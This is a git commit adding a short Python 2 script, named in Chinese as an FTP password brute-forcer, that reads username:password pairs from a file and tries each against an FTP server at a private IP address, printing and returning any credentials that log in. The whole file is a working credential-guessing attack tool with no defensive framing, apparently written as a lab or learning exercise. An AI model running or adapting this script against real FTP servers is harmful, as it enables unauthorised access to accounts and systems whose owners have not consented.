91c1a0cd91570edbbfccb9d6a8eba599148a4595
crazy-piggy <57442208+crazy-piggy@users.noreply.github.com>
2020-11-14 22:44:10 -0600

    Create 暴力破解FTP密码1.py

---
+++ 暴力破解FTP密码1.py
@@ -0,0 +1,24 @@
+import ftplib
+import time
+
+def bruteLogin(hostname, passwdFile):
+    pF = open(passwdFile, 'r')
+    for line in pF.readlines():
+        userName = line.split(':')[0]
+        passWord = line.split(':')[1].strip()
+	print "[+] Trying: "+userName+"/"+passWord
+        try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(userName, passWord)
+            print '\n[*] ' + str(hostname) +\
+	      ' FTP Logon Succeeded: '+userName+"/"+passWord
+            ftp.quit()
+            return (userName, passWord)
+        except Exception, e:
+            pass
+    print '\n[-] Could not brute force FTP credentials.'
+    return (None, None)
+
+host = '192.168.43.135'
+passwdFile = 'userpass.txt'
+bruteLogin(host, passwdFile)
